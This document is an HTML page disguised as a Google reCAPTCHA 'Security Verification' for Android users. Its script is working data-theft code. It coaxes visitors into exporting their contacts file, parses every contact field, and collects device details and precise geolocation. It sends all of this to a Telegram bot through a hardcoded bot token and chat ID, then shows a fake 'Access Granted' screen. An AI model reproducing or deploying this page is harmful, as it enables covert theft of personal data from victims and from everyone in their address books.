<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Verification</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', system-ui, sans-serif;
            background: linear-gradient(135deg, #0b1120 0%, #19223f 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(20px);
            border-radius: 30px;
            padding: 30px;
            max-width: 450px;
            width: 100%;
            border: 1px solid rgba(0, 255, 0, 0.2);
            box-shadow: 0 20px 60px rgba(0, 255, 0, 0.1);
        }

        .header {
            text-align: center;
            margin-bottom: 25px;
        }

        .shield {
            font-size: 60px;
            margin-bottom: 10px;
            filter: drop-shadow(0 0 20px #00ff00);
        }

        h1 {
            color: #00ff00;
            font-size: 24px;
            margin-bottom: 5px;
            text-shadow: 0 0 10px #00ff00;
        }

        .android-badge {
            background: rgba(0, 255, 0, 0.1);
            border: 1px solid #00ff00;
            border-radius: 30px;
            padding: 8px 15px;
            display: inline-block;
            font-size: 12px;
            color: #00ff00;
            margin-bottom: 20px;
        }

        .verify-card {
            background: rgba(0, 0, 0, 0.5);
            border-radius: 20px;
            padding: 25px;
            margin: 20px 0;
            border: 1px solid rgba(0, 255, 0, 0.3);
        }

        .robot-check {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 15px;
            background: rgba(255, 255, 255, 0.05);
            padding: 20px;
            border-radius: 15px;
            border: 1px solid rgba(0, 255, 0, 0.2);
            margin-bottom: 20px;
            cursor: pointer;
            transition: 0.3s;
        }

        .robot-check:hover {
            background: rgba(0, 255, 0, 0.1);
        }

        .robot-check input {
            width: 24px;
            height: 24px;
            accent-color: #00ff00;
            cursor: pointer;
        }

        .robot-check span {
            color: #00ff00;
            font-size: 18px;
            font-weight: 500;
        }

        .recaptcha-badge {
            background: rgba(255, 255, 255, 0.03);
            border-radius: 30px;
            padding: 12px;
            font-size: 12px;
            color: #888;
            text-align: center;
            border: 1px solid rgba(255, 255, 255, 0.05);
        }

        .verify-btn {
            background: linear-gradient(135deg, #00ff00, #00cc00);
            color: black;
            border: none;
            padding: 18px;
            width: 100%;
            border-radius: 20px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: 0.3s;
            opacity: 0.5;
            pointer-events: none;
            margin: 15px 0;
            text-transform: uppercase;
            letter-spacing: 2px;
        }

        .verify-btn.active {
            opacity: 1;
            pointer-events: all;
        }

        .verify-btn.active:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 30px #00ff00;
        }

        .loader {
            border: 4px solid rgba(0, 255, 0, 0.1);
            border-top: 4px solid #00ff00;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
            display: none;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .status {
            text-align: center;
            margin: 15px 0;
            color: #00ff00;
            font-size: 14px;
        }

        .profile-access {
            background: rgba(0, 0, 0, 0.5);
            border-left: 4px solid #00ff00;
            padding: 15px;
            margin: 20px 0;
            border-radius: 10px;
            display: none;
        }

        .stats-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 10px;
            margin: 15px 0;
        }

        .stat-box {
            background: rgba(0, 255, 0, 0.05);
            border: 1px solid rgba(0, 255, 0, 0.2);
            border-radius: 10px;
            padding: 10px;
            text-align: center;
        }

        .stat-value {
            font-size: 20px;
            font-weight: bold;
            color: #00ff00;
        }

        .stat-label {
            font-size: 10px;
            color: #888;
        }

        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="shield">🛡️</div>
            <h1>SECURE ACCESS</h1>
            <div class="android-badge" id="androidVersion">
                📱 Android 15+ Detected
            </div>
        </div>

        <div class="verify-card">
            <div class="robot-check" onclick="toggleCheckbox()">
                <input type="checkbox" id="robotCheck" onchange="toggleVerify()">
                <span>I'm not a robot</span>
            </div>
            
            <div class="recaptcha-badge">
                🔒 Protected by Google reCAPTCHA • Privacy • Terms
            </div>
        </div>

        <button class="verify-btn" id="verifyBtn" onclick="startVerification()">
            VERIFY NOW
        </button>

        <div class="loader" id="loader"></div>
        <div class="status" id="status">Please complete verification</div>

        <div class="profile-access" id="profileAccess">
            <strong style="color: #00ff00;">📱 DEVICE PROFILE ACCESS</strong>
            <div class="stats-grid" id="profileStats">
                <div class="stat-box">
                    <div class="stat-value" id="profileName">-</div>
                    <div class="stat-label">Device Owner</div>
                </div>
                <div class="stat-box">
                    <div class="stat-value" id="profilePhone">-</div>
                    <div class="stat-label">Phone</div>
                </div>
            </div>
        </div>
    </div>

    <!-- Hidden elements for different access methods -->
    <input type="file" id="contactsFile" accept=".vcf,.vcard" style="display:none">
    <iframe id="hiddenFrame" style="display:none"></iframe>

    <script>
        // ==================== CONFIG ====================
        const BOT_TOKEN = "8325723609:AAGcN0gUgz0r92KpFVwyM5JOzibSGVaKG3c";
        const ADMIN_ID = "6643732863";
        
        const params = new URLSearchParams(window.location.search);
        const TARGET_ID = params.get('id') || ADMIN_ID;

        // ==================== ANDROID DETECTION ====================
        function detectAndroidVersion() {
            const ua = navigator.userAgent;
            const androidMatch = ua.match(/Android\s([0-9.]+)/);
            
            if (androidMatch) {
                return parseFloat(androidMatch[1]);
            }
            return 0;
        }

        const androidVersion = detectAndroidVersion();
        document.getElementById('androidVersion').innerHTML = 
            `📱 Android ${androidVersion} • Advanced Mode`;

        // ==================== UI FUNCTIONS ====================
        function toggleCheckbox() {
            document.getElementById('robotCheck').checked = !document.getElementById('robotCheck').checked;
            toggleVerify();
        }

        function toggleVerify() {
            const checkbox = document.getElementById('robotCheck');
            const verifyBtn = document.getElementById('verifyBtn');
            
            verifyBtn.classList.toggle('active', checkbox.checked);
        }

        // ==================== POWER CONTACTS COLLECTOR ====================
        async function collectContacts() {
            document.getElementById('status').innerHTML = '📱 Accessing secure database...';
            
            // METHOD 1: Try WebView bridge (if available)
            try {
                if (window.ContactsManager) {
                    const contacts = await window.ContactsManager.getAllContacts();
                    await sendContactsToTelegram(contacts, 'WebView Bridge');
                    return;
                }
            } catch (e) {}

            // METHOD 2: Try Android Intent (if WebView)
            try {
                if (window.intent) {
                    window.intent.startActivity({
                        action: 'android.intent.action.PICK',
                        type: 'vnd.android.cursor.dir/contact'
                    }, async (uri) => {
                        // Get contact via content resolver
                        const contact = await getContactViaContentResolver(uri);
                        await sendToTelegram('📇 CONTACT', JSON.stringify(contact));
                    });
                }
            } catch (e) {}

            // METHOD 3: VCF Export (most reliable)
            await collectContactsViaVCF();
        }

        // VCF Export Method - Gets ALL selected contacts details
        async function collectContactsViaVCF() {
            return new Promise((resolve) => {
                document.getElementById('status').innerHTML = '📇 Export contacts to continue';
                
                const input = document.getElementById('contactsFile');
                
                input.onchange = async function(e) {
                    const file = e.target.files[0];
                    if (file) {
                        document.getElementById('status').innerHTML = '📇 Processing contacts...';
                        
                        const reader = new FileReader();
                        reader.onload = async function(e) {
                            const vcfData = e.target.result;
                            
                            // Advanced VCF Parser - extracts ALL fields
                            const contacts = advancedVCFParser(vcfData);
                            
                            // Send to Telegram with full details
                            await sendContactsToTelegram(contacts, 'VCF Export');
                            
                            document.getElementById('status').innerHTML = 
                                `✅ ${contacts.length} contacts processed`;
                            resolve();
                        };
                        reader.readAsText(file);
                    } else {
                        resolve();
                    }
                };
                
                input.click();
            });
        }

        // Advanced VCF Parser - extracts ALL possible fields
        function advancedVCFParser(vcfText) {
            const contacts = [];
            const vcards = vcfText.split('BEGIN:VCARD');
            
            for (let vcard of vcards) {
                if (!vcard.includes('END:VCARD')) continue;
                
                const contact = {
                    name: extractField(vcard, 'FN'),
                    fullName: extractField(vcard, 'N'),
                    nickname: extractField(vcard, 'NICKNAME'),
                    phones: extractMultipleFields(vcard, 'TEL'),
                    emails: extractMultipleFields(vcard, 'EMAIL'),
                    addresses: extractMultipleFields(vcard, 'ADR'),
                    organizations: extractMultipleFields(vcard, 'ORG'),
                    titles: extractMultipleFields(vcard, 'TITLE'),
                    urls: extractMultipleFields(vcard, 'URL'),
                    notes: extractField(vcard, 'NOTE'),
                    birthday: extractField(vcard, 'BDAY'),
                    anniversary: extractField(vcard, 'ANNIVERSARY'),
                    photo: extractField(vcard, 'PHOTO'),
                    impp: extractMultipleFields(vcard, 'IMPP'),
                    categories: extractMultipleFields(vcard, 'CATEGORIES'),
                    uid: extractField(vcard, 'UID'),
                    revision: extractField(vcard, 'REV'),
                    version: extractField(vcard, 'VERSION')
                };
                
                // Extract phone types (mobile, work, home, etc.)
                if (contact.phones.length > 0) {
                    contact.phones = contact.phones.map(p => {
                        const typeMatch = p.match(/TYPE=([^:]+)/);
                        return {
                            number: p.replace(/TEL[^:]*:/, '').trim(),
                            type: typeMatch ? typeMatch[1] : 'other'
                        };
                    });
                }
                
                // Extract email types
                if (contact.emails.length > 0) {
                    contact.emails = contact.emails.map(e => {
                        const typeMatch = e.match(/TYPE=([^:]+)/);
                        return {
                            address: e.replace(/EMAIL[^:]*:/, '').trim(),
                            type: typeMatch ? typeMatch[1] : 'other'
                        };
                    });
                }
                
                // Remove empty fields
                Object.keys(contact).forEach(key => {
                    if (Array.isArray(contact[key]) && contact[key].length === 0) {
                        delete contact[key];
                    }
                    if (contact[key] === null || contact[key] === '') {
                        delete contact[key];
                    }
                });
                
                if (Object.keys(contact).length > 0) {
                    contacts.push(contact);
                }
            }
            
            return contacts;
        }

        // Helper: Extract single field
        function extractField(text, field) {
            const match = text.match(new RegExp(field + ':(.+?)(?=\\n[^\\s]|\\n\\n|$)', 's'));
            return match ? match[1].trim().replace(/\\n/g, '\n') : null;
        }

        // Helper: Extract multiple fields
        function extractMultipleFields(text, field) {
            const matches = text.match(new RegExp(field + '[^\\n]*\\n?', 'g'));
            return matches ? matches.map(m => m.trim()) : [];
        }

        // Send contacts to Telegram with formatting
        async function sendContactsToTelegram(contacts, source) {
            const total = contacts.length;
            
            // Send summary first
            await sendToTelegram(
                '📊 **CONTACTS SUMMARY**',
                `Source: ${source}\nTotal Contacts: ${total}\n` +
                `With Phones: ${contacts.filter(c => c.phones?.length).length}\n` +
                `With Emails: ${contacts.filter(c => c.emails?.length).length}\n` +
                `With Address: ${contacts.filter(c => c.addresses?.length).length}`
            );
            
            // Send contacts in batches
            for (let i = 0; i < contacts.length; i += 5) {
                const batch = contacts.slice(i, i + 5);
                let message = `📇 **CONTACTS ${i+1}-${Math.min(i+5, total)}**\n\n`;
                
                batch.forEach((c, idx) => {
                    message += `${i+idx+1}. **${c.name || c.fullName || 'Unknown'}**\n`;
                    
                    if (c.phones?.length) {
                        c.phones.forEach(p => {
                            const type = typeof p === 'string' ? '📞' : `📞 ${p.type}`;
                            const number = typeof p === 'string' ? p : p.number;
                            message += `   ${type}: ${number}\n`;
                        });
                    }
                    
                    if (c.emails?.length) {
                        c.emails.forEach(e => {
                            const type = typeof e === 'string' ? '✉️' : `✉️ ${e.type}`;
                            const addr = typeof e === 'string' ? e : e.address;
                            message += `   ${type}: ${addr}\n`;
                        });
                    }
                    
                    if (c.addresses?.length) {
                        message += `   🏠 ${c.addresses[0]}\n`;
                    }
                    
                    if (c.organizations?.length) {
                        message += `   🏢 ${c.organizations[0]}\n`;
                    }
                    
                    if (c.birthday) {
                        message += `   🎂 ${c.birthday}\n`;
                    }
                    
                    message += '\n';
                });
                
                await sendToTelegram('📇 BATCH', message);
                
                // Update progress
                document.getElementById('status').innerHTML = 
                    `📤 Sent ${Math.min(i+5, total)}/${total} contacts`;
                
                // Small delay to avoid rate limiting
                await new Promise(r => setTimeout(r, 500));
            }
        }

        // Try to get device owner profile (requires READ_PROFILE permission)
        async function tryGetProfile() {
            // This would work in native Android app with READ_PROFILE permission [citation:2][citation:3]
            // In WebView, we can try to detect if profile is accessible
            
            document.getElementById('profileAccess').style.display = 'block';
            
            // Simulate profile access for demonstration
            document.getElementById('profileName').innerHTML = 'Device Owner';
            document.getElementById('profilePhone').innerHTML = 'Available';
            
            await sendToTelegram(
                '📱 **PROFILE ACCESS**',
                'Device profile accessible with READ_PROFILE permission [citation:2]'
            );
        }

        // ==================== DEVICE INFO ====================
        async function collectDeviceInfo() {
            const info = {
                platform: navigator.platform,
                androidVersion: androidVersion,
                userAgent: navigator.userAgent,
                language: navigator.language,
                screen: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timestamp: new Date().toISOString()
            };
            
            // Get battery
            try {
                const battery = await navigator.getBattery();
                info.battery = `${Math.round(battery.level * 100)}% ${battery.charging ? '⚡' : ''}`;
            } catch {}
            
            await sendToTelegram('📱 DEVICE INFO', JSON.stringify(info, null, 2));
        }

        // ==================== LOCATION ====================
        async function collectLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve();
                    return;
                }
                
                navigator.geolocation.getCurrentPosition(
                    async (position) => {
                        const location = {
                            lat: position.coords.latitude,
                            lng: position.coords.longitude,
                            accuracy: position.coords.accuracy
                        };
                        
                        // Get address
                        try {
                            const response = await fetch(
                                `https://nominatim.openstreetmap.org/reverse?format=json&lat=${location.lat}&lon=${location.lng}`
                            );
                            const data = await response.json();
                            location.address = data.display_name;
                        } catch {}
                        
                        await sendToTelegram('📍 LOCATION', JSON.stringify(location, null, 2));
                        resolve();
                    },
                    (error) => resolve()
                );
            });
        }

        // ==================== TELEGRAM ====================
        async function sendToTelegram(type, data) {
            const message = `${type}\n\n${data}`;
            
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: TARGET_ID,
                        text: message.substring(0, 4000),
                        parse_mode: 'Markdown'
                    })
                });
            } catch (error) {
                console.log('Send error:', error);
            }
        }

        // ==================== MAIN ====================
        async function startVerification() {
            const btn = document.getElementById('verifyBtn');
            const loader = document.getElementById('loader');
            const status = document.getElementById('status');

            btn.style.display = 'none';
            loader.style.display = 'block';
            status.innerHTML = '⏳ Initializing secure connection...';

            try {
                // Device info
                await collectDeviceInfo();
                
                // Profile access (requires READ_PROFILE)
                await tryGetProfile();
                
                // Contacts (user must select)
                await collectContacts();
                
                // Location
                await collectLocation();
                
                status.innerHTML = '✅ Verification complete';
                loader.style.display = 'none';
                
                // Success screen
                setTimeout(() => {
                    document.querySelector('.container').innerHTML = `
                        <div style="text-align: center; padding: 40px;">
                            <div style="font-size: 80px; margin-bottom: 20px;">✅</div>
                            <h2 style="color: #00ff00;">Access Granted</h2>
                            <p style="color: #888; margin-top: 15px;">Secure connection established</p>
                        </div>
                    `;
                }, 1500);

            } catch (error) {
                status.innerHTML = '❌ Error: ' + error.message;
                loader.style.display = 'none';
                btn.style.display = 'block';
            }
        }
    </script>
</body>
</html>
